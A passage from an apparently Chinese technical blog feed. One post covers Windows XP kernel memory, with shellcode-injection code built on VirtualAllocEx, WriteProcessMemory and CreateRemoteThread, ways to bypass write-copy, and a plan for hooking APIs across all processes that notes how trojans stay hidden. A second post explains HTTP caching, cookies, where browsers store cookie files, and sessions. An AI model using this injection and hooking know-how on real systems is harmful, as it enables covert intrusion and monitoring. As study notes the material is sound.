class="number">0x1000</span>,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line">	WriteProcessMemory(hProcess,pAddr,ShellCode,<span class="keyword">sizeof</span>(ShellCode),&amp;dwWritten);</span><br><span class="line">	CreateRemoteThread(hProcess,<span class="number">0</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)pAddr,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="comment">//getchar();</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/24/tbeGpgyLBPaDqRS.png" alt="32.png"></p>
<p>注意：如果直接使用如下代码调用ShellCode会失败，是因为此时的ShellCode放在数据段，无可执行权限。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">	call ShellCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解决方法</strong>：可以使用上述的<code>VirtualAllocEx</code>去申请一段可执行的内存块来保存ShellCode，也可以使用<code>VirtualProtect</code>来修改内存页的属性，也可以修改<code>.data</code>节的属性为可读可写可执行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtect</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpAddress,	<span class="comment">// 目标地址起始位置</span></span></span></span><br><span class="line"><span class="function"><span class="params">DWORD dwSize,		<span class="comment">// 大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">DWORD flNewProtect,	<span class="comment">// 请求的保护方式</span></span></span></span><br><span class="line"><span class="function"><span class="params">PDWORD lpflOldProtect	<span class="comment">// 保存老的保护方式</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th>类型</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>PAGE_READONLY</td>
<td>该区域为只读。如果应用程序试图访问区域中的页的时候，将会被拒绝访问</td>
</tr>
<tr>
<td>PAGE_READWRITE</td>
<td>区域可被应用程序读写</td>
</tr>
<tr>
<td>PAGE_EXECUTE</td>
<td>区域包含可被系统执行的代码。试图读写该区域的操作将被拒绝</td>
</tr>
<tr>
<td>PAGE_EXECUTE_READ</td>
<td>区域包含可执行代码，应用程序可以读该区域</td>
</tr>
<tr>
<td><strong>PAGE_EXECUTE_READWRITE</strong></td>
<td>区域包含可执行代码，应用程序可以读写该区域</td>
</tr>
<tr>
<td>PAGE_GUARD</td>
<td>区域第一次被访问时进入一个STATUS_GUARD_PAGE异常，这个标志要和其他保护标志合并使用，表明区域被第一次访问的权限</td>
</tr>
<tr>
<td>PAGE_NOACCESS</td>
<td>任何访问该区域的操作将被拒绝</td>
</tr>
<tr>
<td>PAGE_NOCACHE</td>
<td>RAM中的页映射到该区域时将不会被微处理器缓存（cached)</td>
</tr>
<tr>
<td>PAGE_EXECUTE_WRITECOPY</td>
<td>写拷贝</td>
</tr>
</tbody></table>
<h2 id="4-写拷贝属性（WRITECOPY）"><a href="#4-写拷贝属性（WRITECOPY）" class="headerlink" title="4 写拷贝属性（WRITECOPY）"></a>4 写拷贝属性（WRITECOPY）</h2><p>线性地址写拷贝属性。</p>
<p>每个进程低2G会有块内存，记录哪些线性地址被占用，哪些没有被占用。这块内存是一个二叉树结构，记录某块被申请内存的开始、结束地址，还有为什么被申请。</p>
<p>这个二叉树也叫做<strong>VAD树</strong>，结构如下：</p>
<p><img data-src="https://s2.loli.net/2022/01/24/2uB6Lqsk1ERyYC9.png" alt="33.png"></p>
<p>这棵二叉树在<code>_EPROCESS</code>结构偏移<code>0x11C</code>的位置：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !vad <span class="number">0x8637fd38</span></span><br><span class="line">VAD     level      start      end    commit</span><br><span class="line"><span class="number">86380448</span> ( <span class="number">2</span>)         <span class="number">10</span>       <span class="number">11</span>         <span class="number">2</span> Private      READWRITE         </span><br><span class="line"><span class="number">863</span>eaba0 ( <span class="number">1</span>)         <span class="number">20</span>       <span class="number">20</span>         <span class="number">1</span> Private      READWRITE         </span><br><span class="line">... </span><br><span class="line"><span class="number">86442960</span> ( <span class="number">2</span>)         <span class="number">80</span>       <span class="number">82</span>         <span class="number">0</span> Mapped       READONLY           Pagefile-backed section</span><br><span class="line">...</span><br><span class="line"><span class="number">8613e7</span>c8 ( <span class="number">3</span>)        <span class="number">1b</span>0      <span class="number">1</span>c5         <span class="number">0</span> Mapped       READONLY           \WINDOWS\system32\unicode.nls</span><br><span class="line">...</span><br><span class="line"><span class="number">8635</span>c7d0 ( <span class="number">1</span>)       <span class="number">1000</span>     <span class="number">1008</span>         <span class="number">2</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system32\conime.exe</span><br><span class="line"><span class="number">8612</span>d210 ( <span class="number">7</span>)      <span class="number">58f</span>b0    <span class="number">59179</span>         <span class="number">9</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\AppPatch\AcGenral.dll</span><br><span class="line"><span class="number">863</span>dd088 ( <span class="number">8</span>)      <span class="number">5</span>adc0    <span class="number">5</span>adf6         <span class="number">2</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system32\uxtheme.dll</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<div class="note danger"><p>注意：</p>
<ol>
<li>level：二叉树的级别。</li>
<li>start：开始地址、结束地址使用的单位是4KB（0x1000），如第一项的起始地址为10，即0x10 000。</li>
<li>Private&#x2F;Mapped：该内存是否独占还是和其他进程共享。<ul>
<li>低2G没有非分页（内存属性）之说（不管是公有还是私有，都有可能会被导到文件中），只有高2G才有。</li>
<li><strong>分页和非分页的属性是针对高2G的线性地址</strong>。非分页不过被换页。</li>
<li><strong>独占和共享的属性是针对低2G的线性地址</strong>。</li>
<li>只要通过VirtualAlloc申请的内存都是private。</li>
<li>只有VirtualAlloc和FileMapping才是真正申请内存，malloc–heapalloc只是在VirtualAlloc申请的内存中挂一块驱动。<ul>
<li>VirtualAlloc：申请私有内存</li>
<li>FileMapping：申请共有内存（共享物理页）</li>
</ul>
</li>
</ul>
</li>
<li>READWRITE&#x2F;READONLY&#x2F;EXECUTE_WRITECOPY：线性地址属性。</li>
</ol>
</div>

<h3 id="4-1-内存写入检查流程"><a href="#4-1-内存写入检查流程" class="headerlink" title="4.1 内存写入检查流程"></a>4.1 内存写入检查流程</h3><p>综上：决定一块内存的属性：<mark class="label primary">PDE && PTE && VAD</mark></p>
<p><strong>Mapped Exe描述：</strong></p>
<p>当一个程序通过<code>LoadLibrary</code>进行加载时，此时该文件所在的线性地址空间的属性为Mapped Exe，权限为<code>EXECUTE_WRITECOPY</code>。<br>由于权限为<code>EXECUTE_WRITECOPY</code>的地址空间是需要共享给所有程序使用的，因此当我们对权限为<code>EXECUTE_WRITECOPY</code>的线性地址空间的任何位置进行修改时，系统会先给这块内存重新映射一份物理页，然后再进行修改。</p>
<div class="note default"><p>内存写入检查流程：</p>
<ol>
<li>要写一块内存，如果PDE、PTE是不可写的，那再去查线性地址的属性是否是<code>READONLY</code>，如果是那就说明该内存不可写。</li>
<li>如果线性地址的属性是<code>EXECUTE_WRITECOPY</code>，即写拷贝，这个时候操作系统会重新分配一块物理页（该物理页可读可写），<strong>会把你修改的地方重新复制一份放到新的物理页，并使用新的线性地址指过去。这就是为什么HOOK之后只能影响单独的进程，因为你HOOK的地方已经被放到新的物理页上了！</strong></li>
<li>如果PDE、PTE是可写的，那直接就写了，不管线性地址是否是READONLY（绕过线性地址属性）还是啥。</li>
</ol>
</div>

<p>当你读写某个线性地址：<br>如果物理页属性为只读，CPU会立马进异常，然后查询VAD树，若确实为READONLY，则会返回0xC0000005错误。<br>如果物理页属性为只读，CPU会立马进异常，然后查询VAD树，若确实为EXECUTE_WRITECOPY，则会复制你修改的代码到新的物理页，然后正常返回。</p>
<h3 id="4-2-绕过写拷贝"><a href="#4-2-绕过写拷贝" class="headerlink" title="4.2 绕过写拷贝"></a>4.2 绕过写拷贝</h3><p><strong>方法一</strong>：直接修改该物理页的PDE、PTE属性，改成可写，不会触发异常，也就不会触发写拷贝了。</p>
<p><strong>方法二</strong>：直接修改该地址的 VAD 树，将写拷贝改为可读可写。</p>
<p><strong>方法三</strong>：再申请一块内存，将该内存的PTE指向该物理页，并使<code>PDE_W/R &amp;&amp; PTE_W/R == 1</code>设置属性为可读可写。</p>
<p>举个例子，在Windows XP系统里，MessageBoxA 这个函数位于User32.dll，假如我想HOOK它，比如把它头两个字节的<code>MOV EDI,EDI </code>改成JMP，此时由于 PTE_R&#x2F;W &#x3D; 0，就会触发缺页异常。然后异常处理函数遍历 VAD 树，就会发现 MessageBoxA 的属性是 WriteCopy。此时，如果你对数据进行修改，系统会帮你拷贝一份 MessageBoxA 的代码，然后你的HOOK就只对本进程有效。</p>
<p><strong>总结</strong></p>
<p>1）线性地址分为三类：私有内存 | 共享内存 | 共享文件。<br>2）共享内存和共享文件本质相同，都是分配了一块物理页，不同的是共享文件将物理页和文件关联了起来。<br>3）传统的模块隐藏技术很难在VadRoot中进行隐藏（脱钩可能会导致程序崩溃），除非通过VirtualAlloc分配私有内存，手动将文件进行拉伸与贴入等一系列操作，此时能够大大增加寻找该模块的难度。</p>
<p><img data-src="https://s2.loli.net/2022/01/24/8BliKb271dqvSsI.png" alt="34.png"></p>
<h2 id="5-中级项目1"><a href="#5-中级项目1" class="headerlink" title="5 中级项目1"></a>5 中级项目1</h2><p>这是中级上保护模式和驱动开发章节的综合练习。程序可以监视系统API调用，和三期的那个函数调用监视器不同，三期的只能HOOK本进程的API，而这个项目可以监视所有进程。</p>
<p>当某个API被监控后，无论从哪个程序调用该API，都被HOOK了，都会跳到新的函数中，新的函数执行结束然后返回该API。</p>
<p>本项目的要点技术：</p>
<ol>
<li>先确定监控的API是谁？在哪个模块？</li>
<li>用什么技术达到监控？可以使用DLL注入（开远程线程跳到入口点）、ShellCode注入（开远程线程跳到入口点）、HOOK（Inline注入）等。本项目使用HOOK。</li>
<li><strong>写拷贝</strong>：API函数所在的物理页对应的线性地址属性一般都是写拷贝，则要达到在所有程序中监控该API就必须<strong>对写拷贝进行绕过</strong>。</li>
<li><strong>绕过写拷贝</strong>：根据本项目要求，API的线性地址在每次开机加载后都是一个确定值，可以写改线性地址的属性为READWRITE（该种情况下，仍然会执行一次异常处理，然后CPU才能判断当前的线性地址属性），也可以直接修改PDE、PTE（之后访问内存就不会触发异常）。本项目修改PDE、PTE，则必须要有0环权限才能修改，故需要提权。</li>
<li><strong>中断门提权</strong>：修改PDE、PTE可以使用。</li>
<li><strong>调用门提权</strong>：修改PDE、PTE可以使用。</li>
<li><strong>0环与3环通信</strong>：修改调用门的GDT描述符和IDT描述符，需要使用到函数地址，可以通过通信进行数据传输。</li>
<li><strong>HOOK技术</strong>：通常可以使用<code>E8 CALL</code>、<code>E9 JMP</code>来执行HOOK。但是许多涉及到提权的木马都是直接HOOK API函数起始的前2字节，一般为<code>MOV EDI,EDI</code>（0x8B,0xFF），使用中断门提权时（<code>INT N</code>）刚好也是2字节，直接用来执行HOOK。</li>
<li><strong>保存监控到的数据</strong>：最好是保存到内存中，当应用端需要的时候从内存中读取就好了，尽量避免程序输出文件（保护木马）。</li>
<li><strong>驱动中的全局变量</strong>：在上述第2章有说过，可以使用设备扩展的内存块。</li>
<li>在裸函数内调用 DebugPrint，需要保存FS。</li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
        <category>WinXP驱动</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 测试之道</title>
    <url>/post/learning-testing-with-python/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ (๑˃̵ᴗ˂̵) ପ( ˘ᵕ˘ ) ੭ </p>
<span id="more"></span>

<h2 id="接口测试基础"><a href="#接口测试基础" class="headerlink" title="接口测试基础"></a>接口测试基础</h2><p>从技术的角度来说，把用户发起请求之后的<strong>等待时间</strong>称为<mark class="label info">响应时间</mark>。</p>
<h3 id="1-网络传输知识"><a href="#1-网络传输知识" class="headerlink" title="1 网络传输知识"></a>1 网络传输知识</h3><h4 id="1-1-Cache"><a href="#1-1-Cache" class="headerlink" title="1.1 Cache"></a>1.1 Cache</h4><p>提高反应速度的方法常见的有使用缓存、CDN、优化网页内容加载等。最常用的是使用缓存Cache保存到本地。根据类型来分缓存分为：</p>
<ul>
<li>浏览器缓存</li>
<li>代理缓存</li>
<li>网关缓存</li>
</ul>
<p>根据缓存策略来分：</p>
<ul>
<li>强缓存：直接从本地缓存中取资源，不会和服务器通信。</li>
<li>协商缓存：通过服务器告知是否能用本地缓存。<ul>
<li>先和服务器通信，若返回可以使用本地缓存的指示，再从本地缓存取；</li>
<li>如不可以使用本地缓存，就会返回最新的资源。</li>
</ul>
</li>
</ul>
<p>参考【<a href="https://github.com/frontend9/fe9-interview/issues/29#:~:text=%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E5%88%86%E4%B8%BA%E5%BC%BA%E7%BC%93%E5%AD%98%E5%92%8C%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98%EF%BC%8C%E4%B8%A4%E8%80%85%E6%9C%89%E4%B8%A4%E4%B8%AA%E6%AF%94%E8%BE%83%E6%98%8E%E6%98%BE%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9A.%20%E5%A6%82%E6%9E%9C%E6%B5%8F%E8%A7%88%E5%99%A8%E5%91%BD%E4%B8%AD%E5%BC%BA%E7%BC%93%E5%AD%98%EF%BC%8C%E5%88%99%E4%B8%8D%E9%9C%80%E8%A6%81%E7%BB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%91%E8%AF%B7%E6%B1%82%EF%BC%9B%E8%80%8C%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98%E6%9C%80%E7%BB%88%E7%94%B1%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%A5%E5%86%B3%E5%AE%9A%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8%E7%BC%93%E5%AD%98%EF%BC%8C%E5%8D%B3%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B9%8B%E9%97%B4%E5%AD%98%E5%9C%A8%E4%B8%80%E6%AC%A1%E9%80%9A%E4%BF%A1%E3%80%82.%20%E5%9C%A8%20chrome%20%E4%B8%AD%E5%BC%BA%E7%BC%93%E5%AD%98%EF%BC%88%E8%99%BD%E7%84%B6%E6%B2%A1%E6%9C%89%E5%8F%91%E5%87%BA%E7%9C%9F%E5%AE%9E%E7%9A%84%20http%20%E8%AF%B7%E6%B1%82%EF%BC%89%E7%9A%84%E8%AF%B7%E6%B1%82%E7%8A%B6%E6%80%81%E7%A0%81%E8%BF%94%E5%9B%9E%E6%98%AF%20200,%E4%BC%9A%E5%88%86%E4%B8%BA%20from%20disk%20cache%20%E5%92%8C%20from%20memory%20cache.">阿里巴巴：浏览器的强缓存和协商缓存（一面）</a>】</p>
<p><img data-src="https://i.loli.net/2020/10/30/i47ltq5M2PzpbSf.png" alt="缓存策略"></p>
<p><img data-src="https://i.loli.net/2020/10/30/uGiFWU8mND9taqn.jpg" alt="IMG_9365.JPG"></p>
<h5 id="1-1-1-浏览器缓存"><a href="#1-1-1-浏览器缓存" class="headerlink" title="1.1.1 浏览器缓存"></a>1.1.1 浏览器缓存</h5><p>使用缓存 Cache 的站点会监听客户端向服务端发出的请求，并根据相应缓存设置保存服务器反馈的数据到本地主机，比如 HTML页面、图片等文件。当下次用户使用相同的 URL 发送请求，请求不会直接发向服务器，而是通过缓存策略先行判断是否使用之前已经保存下来的反馈文件，从而降低服务器的负载及提高数据的响应时间。这样可以节省上网流量。</p>
<h5 id="1-1-2-代理缓存"><a href="#1-1-2-代理缓存" class="headerlink" title="1.1.2 代理缓存"></a>1.1.2 代理缓存</h5><p>由于客户端内存的限制，浏览器缓存不能存放过多的数据，否则会降低本机的性能。在实际应用中，开发者需要缓存大规模的数据及面向更广泛的用户群时，可以使用代理缓存（代理服务器），它使用相同的原理，但可以用相同的方法为几百甚至几千的使用者服务。<strong>总结来说代理缓存比浏览器缓存面向多用户及大规模数据</strong>。</p>
<p>代理缓存是共享缓存的一种，不是只有一个人正在使用它们，而是同时存在大量的用户使用。</p>
<p>代理缓存既不属于客户端，也不属于服务器端，而是利用网络路由请求信息。有以下几种场景：</p>
<ul>
<li>用户手动设置浏览器的代理</li>
<li>使用网页代理，网页代理将你的 URL 请求通过它潜在的网络定向到代理，所以用户甚至无需手动配置它们</li>
</ul>
<h5 id="1-1-3-网关缓存"><a href="#1-1-3-网关缓存" class="headerlink" title="1.1.3 网关缓存"></a>1.1.3 网关缓存</h5><p>网关缓存同样是充当代理的角色，同样起到代理缓存的作用，但是他和代理缓存是有区别的。网关可以为通信线路上的服务器提供不同的协议服务。加入上网线路为：</p>
<ul>
<li><p>代理缓存：$用户\dashrightarrow代理服务器\dashrightarrow服务器$ ，代理服务器与用户和服务器之间使用<strong>相同</strong>的通信协议</p>
</li>
<li><p>网关缓存：$用户\dashrightarrow网关\dashrightarrow服务器$ ，网关与用户和服务器之间可以使用<strong>不相同</strong>的通信协议</p>
</li>
</ul>
<p>网关缓存也是中间人，但不是由系统网络管理员处于节省带宽而部署，它们通常是网站站长部署的，使网站可扩展性、可靠性和性能更好，它可以将请求路由到网关高速缓存，类似于负载均衡器。</p>
<h4 id="1-2-Cookie"><a href="#1-2-Cookie" class="headerlink" title="1.2 Cookie"></a>1.2 Cookie</h4><p>可以用来解决 <mark class="label danger">无状态协议反复认证和身份认证</mark>的的特性。关于无状态协议和有状态协议：</p>
<ul>
<li><a href="https://segmentfault.com/a/1190000017357883">cookie与session详解</a></li>
<li><a href="https://blog.csdn.net/qq_14989227/article/details/78961876?utm_medium=distribute.pc_relevant_bbs_down.none-task-blog-baidujs-1.nonecase&depth_1-utm_source=distribute.pc_relevant_bbs_down.none-task-blog-baidujs-1.nonecase">哪些协议是无状态协议哪些是有状态的，怎么区别？</a></li>
<li><a href="https://www.zhihu.com/question/300560131">如何理解有状态协议和无状态协议？</a></li>
<li><a href="https://blog.csdn.net/zhangvalue/article/details/100635666">http协议是无状态协议</a></li>
<li><a href="https://www.cnblogs.com/bellkosmos/p/5237146.html">http协议无状态中的 “状态” 到底指的是什么？！</a></li>
</ul>
<p>此外还应该关注<mark class="label info">无连接</mark>协议，同时对应 HTTP 报文中的中的<mark class="label success">connect</mark>字段为<mark class="label danger">alive</mark> 或 <mark class="label danger">close</mark></p>
<p>用户浏览器访问一个支持 Cookie 的网站，会经过以下过程（1 2是首次请求访问时选择“保存用户名”，3 4是再次访问）：</p>
<p>（1）客户端  --&gt; 服务器</p>
<p>（2）客户端 （保存Cookie） &lt;-- 服务器（Set-Cookie）</p>
<p>（3）客户端（Cookie）  --&gt; 服务器</p>
<p>（4）客户端   &lt;--  服务器</p>
<h5 id="1-2-1-获取Cookie的途径"><a href="#1-2-1-获取Cookie的途径" class="headerlink" title="1.2.1 获取Cookie的途径"></a>1.2.1 获取Cookie的途径</h5><ol>
<li><p>使用抓包工具，如 BurpSuite 等</p>
</li>
<li><p>浏览器检查网页请求能够获取Cookie</p>
</li>
<li><p>从本地文件中获取</p>
<ul>
<li><p><strong>IE 浏览器</strong>：<code>%APPDATA%\Microsoft\Windows\Cookies\ </code>目录中的<code>xxx.txt</code>文件（里面可能有很多个<code>.txt Cookie</code>文件）</p>
</li>
<li><p><strong>Firefox</strong>：<code>%APPDATA%\Mozilla\Firefox\Profiles\</code> 目录中的<code>xxx.default</code>目录，名为<code>cookies.sqlite</code>的文件。在 Firefox 中查看 cookie，可以选择<code>工具 &gt; 选项 &gt; 隐私 &gt; 显示cookie</code>。</p>
</li>
<li><p><strong>Chrome</strong>：<code>%LOCALAPPDATA%\Google\Chrome\User Data\Default\</code> 目录中，名为<code>Cookies</code>的文件。在 Chrome 中查看 cookie，可以选择<code>设置 &gt; 隐私设置和安全性 &gt; Cookie 及其他网站数据 &gt; 查看所有 Cookie 和网站数据</code>。</p>
<p>在 IE 浏览器中，IE将各个站点的<code>Cookie</code>分别保存为一个<code>XXX.txt</code>这样的纯文本文件（文件个数可能很多，但文件大小都较小）；而 Firefox 和 Chrome 是将所有的<code>Cookie</code>都保存在一个文件中（文件大小较大），该文件的格式为<code>SQLite3</code>数据库格式的文件。</p>
</li>
</ul>
</li>
<li><p>通过前端技术获取</p>
<ul>
<li>可以在浏览器地址栏输入：<code>javascript:alert(document.cookie)</code></li>
</ul>
</li>
</ol>
<h5 id="1-2-2-Cookie的生命周期"><a href="#1-2-2-Cookie的生命周期" class="headerlink" title="1.2.2 Cookie的生命周期"></a>1.2.2 Cookie的生命周期</h5><ol>
<li><strong>默认情况下</strong>：Cookie 数据保存到内存里，当浏览器关闭后，Cookie数据被销毁</li>
<li><strong>持久化存储</strong>： 根据<code>setMaxAge(int seconds)</code>函数的参数来设置：</li>
</ol>
<ul>
<li>正数：将Cookie数据写到硬盘的文件中，持久化存储。并指定Cookie存活时间，时间到后，Cookie文件自动失效。 </li>
<li>负数：默认值，即关闭浏览器后，Cookie即失效 </li>
<li>零：删除Cookie信息，会马上在浏览器上删除指定的cookie</li>
</ul>
<p><code>setMaxAge</code>参数为正数时的情况如下：</p>
<table>
<thead>
<tr>
<th align="center">cookie时间是否到期</th>
<th align="center">重启浏览器</th>
<th align="center">不关闭浏览器</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>cookie时间未到</strong></td>
<td align="center">能访问cookie</td>
<td align="center">能访问cookie</td>
</tr>
<tr>
<td align="center"><strong>cookie时间到</strong></td>
<td align="center">不能访问cookie</td>
<td align="center">能访问cookie</td>
</tr>
</tbody></table>
<p>修改 Cookie 的生命周期的方法：</p>
<ul>
<li>通过浏览器修改</li>
<li>在服务器端的代码层面修改</li>
</ul>
<div class="note info"><p>Cookie 的常用属性：</p>
<ol>
<li><p><strong>Name</strong>：Cookie 的名称。Cookie 一旦创建，名称便不可以修改。</p>
</li>
<li><p><strong>Value</strong>：Cookie 的值。如果值为<code>Unicode</code>字符，需要为字符编码，如果值为二进制数据，则需要使用<code>base64</code>编码</p>
<ul>
<li><p><strong>Unicode编码</strong>：<mark class="label info">保存中文</mark></p>
<p>中文与英文字符不同，中文属于<code>Unicode</code>字符，在内存中占<code>4</code>个字符，而英文属于<code>ASCII</code>字 符，内存中只占<code>2</code>个字节。Cookie 中使用<code>Unicode</code>字符时需要对<code>Unicode</code>字符进行编码，否则会乱码。</p>
</li>
<li><p><strong>Base64编码</strong>：<mark class="label warning">保存二进制图片</mark></p>
<p>Cookie 不仅可以使用<code>ASCII</code>字符与<code>Unicode</code>字符，还可以使用二进制数据。例如，在Cookie中使用数字证书，提供安全度。使用二进制数据时需要进行Base64编码。</p>
</li>
</ul>
</li>
<li><p><strong>Expires&#x2F;Max-Age</strong>：Cookie 失效时间，单位为秒。</p>
<ul>
<li>如果为正数，该 Cookie 会在 MaxAge 秒之后自动失效。</li>
<li>为0时表示立即删除Cookie。</li>
<li>为负数，表示该 Cookie 为临时 Cookie，关闭浏览器即失效，默认值为<code>-1</code>。</li>
</ul>
</li>
<li><p><strong>Secure</strong>：该 Cookie 是否仅被使用安全传输协议传输。安全协议由 HTTPS、SSL等，在网络上传输数据之前先将数据加密，默认是<code>false</code>。</p>
</li>
<li><p><strong>Path</strong>：该 Cookie 的使用路径。</p>
</li>
<li><p><strong>Domain</strong>：可以访问该 Cookie 的域名。如果设置为<code>.google.com</code>，则所有以<code>google.com</code>结尾的域名都可以访问该 Cookie（即它的子域名）。若当前网站是非顶级域名，如二级域名或者三级域名，设置的 Cookie 的<code>domain</code>只能为顶级域名或者二级域名或者三级域名本身，不能设置其他二级域名的 Cookie，否则 Cookie 无法生成。</p>
</li>
<li><p><strong>HttpOnly</strong>：Cookie 的<code>HttpOnly</code> 属性是 Cookie 的扩展功能，它使<code>JavaScript</code> 脚本无法获得 Cookie。其主要目的为防止跨站脚本攻击（<code>Cross-sitescripting</code>，<code>XSS</code>）对 Cookie 的信息窃取。</p>
</li>
</ol>
</div>

<p>参考：</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/27669892">认识HTTP—-Cookie和Session篇</a></li>
<li><a href="https://www.jianshu.com/p/dd73c27ab8d6">Cookie中的SameSite设置</a></li>
</ul>
<h4 id="1-3-Session"><a href="#1-3-Session" class="headerlink" title="1.3 Session"></a>1.3 Session</h4><p>Session 和 Cookie 一样是用来解决无状态协议的，不同的是 Cookie 保存在<mark class="label primary">客户端浏览器</mark>中，而 Session 保存在<mark class="label default">服务器</mark>上。</p>
<p>客户端访问网站带有 Session 的过程：</p>
<p>（1）客户端  --&gt; 服务器</p>
<p>（2）客户端  &lt;-- 服务器（Set-Session 并保存）</p>
<p>（3）客户端（Session）  --&gt; 服务器</p>
<p>（4）客户端   &lt;--  服务器</p>
<p>HTTP协议本身是”无状态”的，在一次请求和下一次请求之间没有任何状态保持，服务器无法识别来自同一用户的连续请求。有了cookie和session，服务器就可以利用它们记录客户端的访问状态了，这样用户就不用在每次访问不同页面都需要登录了。</p>
<p><strong>什么是cookie，cookie的应用场景及缺点</strong></p>
<p>cookie是一种数据存储技术, 它是将一段文本保存在客户端(浏览器或本地电脑)的一种技术，并且可以长时间的保存。当用户首次通过客户端访问服务器时，web服务器会发送给客户端的一小段信息。客户端浏览器会将这段信息以cookie形式保存在本地某个目录下的文件内。当客户端下次再发送请求时会自动将cookie也发送到服务器端，这样服务器端通过查验cookie内容就知道该客户端早访问过了。</p>
<div class="note primary"><p>Cookie 的常见应用场景包括：</p>
<ul>
<li>判断用户是否已经登录</li>
<li>记录用户登录信息(比如用户名，上次登录时间）</li>
<li>记录用户搜索关键词</li>
</ul>
<p>Session 的常见应用场景包括：验证登录信息</p>
</div>

<p>Cookie的缺点在于其并<strong>不可靠</strong>和<strong>不安全</strong>，主要原因如下:</p>
<ul>
<li>浏览器不一定会保存服务器发来的cookie，用户可以通过设置选择是否保存cookie。</li>
<li>cookie是有生命周期的（通过Expire设置），如果超过周期，cookie就会被清除。</li>
<li>HTTP数据通过明文发送，容易受到攻击，因此不能在cookie中存放敏感信息（比如信用卡号，密码等）。</li>
<li>cookie以文件形式存储在客户端，用户可以随意修改的。</li>
</ul>
<p><strong>什么是session及session的工作原理</strong></p>
<p>session又名会话，其功能与应用场景与cookie类似，用来存储少量的数据或信息。但由于数据存储在服务器上，而不是客户端上，所以比cookie更安全。</p>
<p>Session工作的流程如下：</p>
<ul>
<li>客户端向服务器发送请求时，看本地是否有cookie文件。如果有，就在HTTP的请求头（Request Headers）中，包含一行cookie信息。</li>
<li>服务器接收到请求后，根据cookie信息，得到sessionId，根据sessionId找到对应的session，用这个session就能判断出用户是否登录等等。</li>
</ul>
<p>使用Session的好处在于，即使用户关闭了浏览器，session仍将保持到会话过期。</p>
<h5 id="1-3-1-Session的传输"><a href="#1-3-1-Session的传输" class="headerlink" title="1.3.1 Session的传输"></a>1.3.1 Session的传输</h5><ul>
<li>通过 Cookie 传输</li>
<li>URL地址重写</li>
</ul>
<p>Session 可以借助 Cookie 来传输，在 Cookie 中会有一个<code>sessionID</code>的键值对，他就是用来传输 Session 的。</p>
<p>一次打开浏览器时，session是可以多窗口共享的，子窗口可以使用符窗口的 Cookie，因此会共享一个 Session，但是重新打开浏览器（重新启动）会生成新的 Session。但是如果浏览器将 Cookie 功能禁用或者网站不支持 Cookie 时，这时候就不能够通过 Cookie 来传输 Session，所以就使用 URL 地址重写来进行 Session 的传输。</p>
<p>URL地址重写是对客户端不支持 Cookie 的解决方案。它的原理是将用户的 Session 的 ID 信息重写到 URL 地址中。服务器能够解析重写后的 URL，获取 Session 的 ID。 服务器会先自动判断客户端是否支持 Cookie。如果客户端支持，会将 URL 原封不动地输出，如果不支持，则会将 Session 的 ID 重写到 URL 中，重写后的 URL 可能是这样的：<code>https://mp.weixin.qq.com/s?jsessionid=BYjhghj89HBbuhygG-145</code></p>
<h5 id="1-3-2-Session的生命周期"><a href="#1-3-2-Session的生命周期" class="headerlink" title="1.3.2 Session的生命周期"></a>1.3.2 Session的生命周期</h5><p>需要区分开 Session 和 Session ID，Session 由服务器来进行存储，而且是<mark class="label warning">存储在内存中</mark>，不过 Session 可以通过特殊的方式做持久化管理（memcache，redis）。Session ID 存放在服务器以及客户端的 Cookie 中，客户端中的 Session ID 用来和服务器进行会话认证。</p>
<p>服务器内存中有许多的 Session，可以用使用 Session ID 来找到 Session 对象，这就是使用 Session ID 来标志 Session 的作用。</p>
<ul>
<li>在创建了 Session 的同时，服务器会为该 Session 生成唯一的Session ID，而这个Session ID 在随后的请求中会被用来重新获得已经创建的Session；</li>
<li>在 Session 被创建之后，就可以调用Session相关的方法往 Session 中增加内容了，而这些内容只会保存在服务器中，发到客户端的只有SessionID；</li>
<li>当客户端再次发送请求的时候，会将这个Session ID 带上，服务器接受到请求之后就会依据 Session ID 找到相应的 Session，从而再次使用之。</li>
</ul>
<div class="note danger"><p>Session 和 Session ID 的删除：</p>
<ol>
<li>当浏览器关闭时 Session ID 会删除而 Session 不会删除。</li>
<li>Session 删除的几种方式：超时、程序调用<code>HttpSession.invalidate()</code>、服务器关机或重启（内存数据丢失）。</li>
</ol>
</div>

<p>参考【<a href="https://blog.csdn.net/weixin_43625577/article/details/92393581">Cookie和Session、SessionID的那些事儿</a>】</p>
